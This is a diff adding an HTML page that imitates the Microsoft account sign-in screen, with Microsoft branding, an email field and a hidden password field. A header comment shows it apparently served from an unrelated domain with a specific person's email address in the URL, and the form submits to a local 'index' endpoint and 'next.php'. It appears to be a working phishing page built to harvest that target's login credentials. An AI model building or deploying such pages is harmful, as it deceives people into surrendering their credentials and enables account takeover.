@@ -1,0 +1,308 @@
+<!-- URL =https://adilo-investment.com/adm/?ss=2&ea;=kathleen.anzalone@santacruzco&session;=bf5f43ff7681600165bc7ad83957f3d1bf5f43ff7681600165bc7ad83957f3d1--><!-- w =('ADILO-INVESTMENT.COM', datetime.datetime(2020, 7, 14, 5, 32, 25), datetime.datetime(2021, 7, 14, 5, 32, 25))--><!DOCTYPE html>
+<html dir="ltr" lang="EN-US">
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <meta content="IE=Edge" http-equiv="X-UA-Compatible"/>
+  <base href="."/>
+  <script>
+   function empty() {
+    var x;
+    x = document.getElementById("username").value;
+    if (x == "") {
+        document.getElementById("username").style = "border-color:red";
+		document.getElementById("username_error").style = "display: block";
+        return false;
+    };
+
+}
+  </script>
+  <script>
+   function change() {
+    var e;
+    e = document.getElementById("username").value;
+    if (e !== ""){
+	    document.getElementById("username").style = "";
+		document.getElementById("username_error").style = "display: none";
+	}
+	
+}
+  </script>
+  <title>
+   Sign in
+  </title>
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" name="viewport"/>
+  <link href="./files/favicon.ico" rel="shortcut icon"/>
+  <link href="./files/Converged1033.css" rel="stylesheet" title="Converged" type="text/css"/>
+  <style type="text/css">
+   body.cb input.hip
+    {
+        border-width: 2px !important;
+    }
+  </style>
+  <style type="text/css">
+   body{display:none;}
+  </style>
+  <style type="text/css">
+   body{display:block !important;}
+  </style>
+  <link href="" rel="image_src"/>
+ </head>
+ <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
+  <div>
+   <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
+    <div class="background" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }" role="presentation">
+     <div data-bind="backgroundImage: smallImageUrl()" style='background-image: url("./files/0-small.jpg");'>
+     </div>
+     <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style='background-image: url("./files/0.jpg");'>
+     </div>
+     <div class="background-overlay">
+     </div>
+    </div>
+   </div>
+   <form action="index?&amp;sessionid=e00e3315b815b12797d9d3884cc39ac9&amp;ss=2" autocomplete="off" id="i0281" method="post" name="f1" onsubmit="return delay();" spellcheck="false">
+    <div class="outer" data-bind="component: { name: 'page',
+        params: {
+            serverData: svr,
+            showButtons: svr.A2,
+            showFooterLinks: true,
+            useWizardBehavior: svr.BR,
+            handleWizardButtons: false,
+            password: password,
+            hideFromAria: ariaHidden },
+        event: {
+            footerAgreementClick: footer_agreementClick } }">
+     <div class="middle">
+      <div class="footer default" data-bind="css: { 'default': !backgroundLogoUrl() }" id="footer">
+       <div data-bind="component: { name: 'footer-control',
+            params: {
+                serverData: svr,
+                showLinks: true },
+            event: {
+                agreementClick: footer_agreementClick } }">
+        <div class="footerNode text-secondary" id="footerLinks">
+         <span data-bind="html: svr.aa" id="ftrCopy">
+          ©2020 Microsoft
+         </span>
+         <a data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="" id="ftrTerms">
+          Terms of Use
+         </a>
+         <a data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="" id="ftrPrivacy">
+          Privacy &amp; Cookies
+         </a>
+        </div>
+       </div>
+      </div>
+      <div class="background-logo-holder">
+       <img class="background-logo" id="banner_image" src="files/logo3.png"/>
+      </div>
+      <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }" style="
+    padding-top: 36px;
+">
+       <img class="background-logo" data-bind="attr: { src: backgroundLogoUrl }" id="loader" role="presentation" src="files/load2.gif" style="display:none;margin-bottom: 31px;margin-top: 1‒;max-width: 100%;margin-top: -34px;"/>
+       <div data-bind="component: { name: 'logo-control',
+                    params: {
+                        isChinaDc: svr.fIsChinaDc,
+                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
+        <img class="logo" data-bind="imgSrc" pngsrc="./files/microsoft_logo.png" role="presentation" src="./files/microsoft_logo.svg" svgsrc="./files/microsoft_logo.svg"/>
+       </div>
+       <div data-bind="
+                    css: { 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') },
+                    component: { name: 'pagination-control',
+                        publicMethods: paginationControlMethods,
+                        params: {
+                            initialViewId: initialViewId,
+                            currentViewId: currentViewId,
+                            initialSharedData: initialSharedData,
+                            initialError: $loginPage.getServerError() },
+                        event: {
+                            cancel: paginationControl_onCancel,
+                            showView: $loginPage.view_onShow } }">
+        <div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }">
+         <div data-bind="pageViewComponent: { name: 'login-paginated-username-view',
+                        params: {
+                            serverData: svr,
+                            serverError: initialError,
+                            isInitialView: isInitialState,
+                            displayName: sharedData.displayName,
+                            prefillNames: $loginPage.prefillNames,
+                            flowToken: sharedData.flowToken },
+                        event: {
+                            refresh: $loginPage.view_onRefresh,
+                            redirect: $loginPage.view_onRedirect,
+                            showLearnMore: $loginPage.learnMore_onShow } }" data-viewid="1">
+          <div class="row text-title" data-bind="text: str['WF_STR_HeaderDefault_Title']" id="loginHeader" role="heading">
+           Sign in
+          </div>
+          <div class="row">
+           <div aria-atomic="false" aria-live="assertive" role="alert">
+           </div>
+           <div class="form-group col-md-24">
+            <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox', params: {
+            serverData: svr,
+            textInput: displayName,
+            hasFocus: isFocused,
+            hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
+            hintCss: 'placeholder' + (!svr.Ba ? ' ltr_override' : '') } }">
+             <label id="username_error" style="display: none">
+              <font color="red">
+               Enter a valid email address, phone number, or Skype name.
+              </font>
+             </label>
+             <input class="form-control ltr_override" id="username" maxlength="113" name="username" onblur="change();" placeholder="Email, phone, or Skype" type="email" value=""/>
+             <input aria-hidden="true" autocomplete="off" class="moveOffScreen" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" id="i0118" name="password" tabindex="-1" type="password"/>
+             <div class="progress" data-bind="visible: isRequestPending" id="usernameProgress" role="progressbar" style="display: none;">
+              <hr color="#0066cc" size="1"/>
+              <div>
+              </div>
+              <div>
+              </div>
+              <div>
+              </div>
+              <div>
+              </div>
+              <div>
+              </div>
+              <div>
+              </div>
+             </div>
+             <hr color="#0066cc" size="1"/>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div class="row">
+          <div data-bind="component: { name: 'footer-buttons-field',
+        params: {
+            serverData: svr,
+            isPrimaryButtonEnabled: !isRequestPending(),
+            isPrimaryButtonVisible: svr.A2,
+            isSecondaryButtonEnabled: true,
+            isSecondaryButtonVisible: svr.A2 &amp;&amp; isBackButtonVisible() },
+        event: {
+            primaryButtonClick: primaryButton_onClick,
+            secondaryButtonClick: secondaryButton_onClick } }">
+           <div class="col-xs-24 form-group no-padding-left-right" data-bind="
+     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+     css: { 'no-margin-bottom': removeBottomMargin }">
+            <div class="col-xs-12 secondary" data-bind="css: { 'col-xs-12 secondary': isPrimaryButtonVisible(), 'col-xs-24': !isPrimaryButtonVisible() }">
+             <input class="btn btn-block" data-bind="
+            attr: {
+                'id': secondaryButtonId || 'idBtn_Back',
+                'aria-describedby': secondaryButtonDescribedBy },
+            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
+            hasFocus: focusOnSecondaryButton,
+            click: secondaryButton_onClick,
+            enable: isSecondaryButtonEnabled,
+            visible: isSecondaryButtonVisible" id="idBtn_Back" style="display: none;" type="button" value="Back"/>
+            </div>
+            <div class="col-xs-24" data-bind="css: { 'col-xs-12 primary': isSecondaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }">
+             <div class="text-13 form-group no-margin-bottom" data-bind="
+            css: { 'no-margin-bottom': !svr.B3 &amp;&amp; !svr.showCantAccessAccountLink },
+            htmlWithBindings: html['WF_STR_SignUpLink_Text'],
+            childBindings: { 'signup': { href: svr.b, css: { 'display-inline-block': true }, ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'], click: signup_onClick } }">
+              <a aria-label="Create a Microsoft account" class="display-inline-block" href="https://signup.live.com/signup.aspx?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1506073308&amp;rver=6.7.6640.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fauthRedirect%3dtrue%26nlp%3d1%26RpsCsrfState%3d55744145-df9f-4b42-d610-7776eac27bf1&amp;id=292841&amp;CBCXT=out&amp;fl=wld&amp;cobrandid=90015&amp;contextid=0A756D19FCBE8143&amp;bk=1506073308&amp;uiflavor=web&amp;uaid=d6ee5e91cdc941c5ac139979d5440035&amp;mkt=EN-US&amp;lc=1033" id="signup">
+               Can’t access your account?
+              </a>
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+       <div data-bind="component: { name: 'instrumentation',
+                publicMethods: instrumentationMethods,
+                params: { serverData: svr } }">
+        <div class="form-group" data-bind="
+                    component: { name: 'cred-switch-link-control',
+                        params: {
+                            serverData: svr,
+                            availableCreds: availableCredsWithoutUsername(),
+                            showForgotUsername: svr.fShowForgotUsernameLink },
+                        event: {
+                            switchView: noUsernameCredSwitchLink_onSwitchView,
+                            redirect: onRedirect,
+                            registerDialog: onRegisterDialog,
+                            unregisterDialog: onUnregisterDialog,
+                            showDialog: onShowDialog } }">
+         <!-- -->
+         <div class="form-group">
+          <!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) -->
+          <!-- /ko -->
+          <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
+          <a data-bind="
+            attr: { 'id': switchToCredId },
+            text: switchToCredText,
+            click: switchToCred_onClick" href="next.php?ss=2" id="idA_PWD_SwitchToFido" style="
+    font-size: 13px;
+">
+           Sign in with a security key
+          </a>
+          <!-- ko if: displayHelp && selectedCredType === 7 -->
+          <!-- ko component: { name: 'fido-help-button-control',
+                params: {
+                    isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable() },
+                event: {
+                    registerDialog: onRegisterDialog,
+                    unregisterDialog: onUnregisterDialog,
+                    showDialog: onShowDialog } } -->
+          <!-- -->
+          <span aria-label="Learn more about this sign-in option" class="help-button" data-bind="
+    click: fidoHelp_onClick,
+    pressEnter: fidoHelp_onClick,
+    ariaLabel: str['CT_STR_CredentialPicker_Help_Desc']" role="button" tabindex="0">
+           <!-- ko component: 'accessible-image-control' -->
+           <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
+           <!-- /ko -->
+           <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+           <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
+           <img data-bind="imgSrc" pngsrc="files/quest.png" role="presentation" src="files/quest.png" svgsrc=""/>
+           <!-- /ko -->
+           <!-- /ko -->
+           <!-- /ko -->
+          </span>
+          <div data-bind="component: { name: 'fido-help-dialog-content-control',
+    params: {
+        isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable },
+    event: {
+        registerDialog: onRegisterDialog,
+        unregisterDialog: onUnregisterDialog } }">
+           <!-- -->
+           <div data-bind="component: { name: 'dialog-content-control',
+    params: {
+        dialogId: 1,
+        data: {
+            labelledBy: 'fidoDialogTitle',
+            describedBy: 'fidoDialogDesc fidoDialogDesc2',
+            primaryButtonPreventTabbing: { direction: 'down' },
+            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable } },
+    event: {
+        registerDialog: onRegisterDialog,
+        unregisterDialog: onUnregisterDialog } }">
+            <!-- -->
+           </div>
+          </div>
+          <!-- /ko -->
+          <!-- /ko -->
+          <!-- /ko -->
+          <!-- ko if: credentialCount === 0 && showForgotUsername -->
+          <!-- /ko -->
+         </div>
+         <!-- ko if: credLinkError -->
+         <!-- /ko -->
+        </div>
+        <script>
+         function myFunction()
+{
+    document.getElementById('loader').style='display:block;margin-bottom: 31px;margin-top: 1‒;max-width: 100%;margin-top: -34px;';
+}
+        </script>
+        <input class="btn btn-primary" id="idSIButton9" onclick="myFunction();" style="float:right" type="submit" value="Next"/>
+       </div>
+      </div>
+     </div>
+    </div>
+   </form>
+  </div>
+ </body>
+</html>
